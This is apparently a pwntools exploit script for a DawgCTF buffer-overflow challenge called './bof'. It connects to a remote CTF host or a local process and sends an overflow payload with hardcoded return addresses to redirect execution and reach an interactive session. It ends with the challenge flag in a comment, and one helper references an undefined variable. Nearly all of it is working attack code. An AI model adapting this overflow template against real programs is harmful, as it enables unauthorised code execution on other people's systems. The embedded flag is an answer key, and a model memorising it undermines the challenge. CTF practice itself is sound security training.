from pwn import *
import signal
import sys

# Init config
prog_name = './bof'
context.binary = prog_name 
## init of python
debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("ctf.umbccd.io", 4000)
  online=True
elif(debug == 1):
  r = process(prog_name) #, env={'LD_PRELOAD':'./libc-2.27.so'})

def halt():
  while True:
    log.info( r.recvline() )

# or if you have issue, use interactive but instead you need to open it in another terminal
def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def get_one_gadget():
    return list(map(
        int,
        subprocess.check_output(['one_gadget', '--raw', libcz.path]).split(b' ')
    ))

def pwn():
  r.recvuntil("What's your name?")

  if not online:
    gdb.attach(r, '''
      set follow-fork-mode parent
      b *0x0804921c
      c
      ''')

  buff = "A"*58
  buff += "B"*4
  buff += p32(0x8049050)
  buff += "CCCC"
  buff += p32(0x804a008)
  r.sendline( buff)

  r.recvuntil("What song will you be singing?")
  r.sendline("ok")

  r.interactive()
  return
  # DawgCTF{wh@t_teAm?}

pwn()

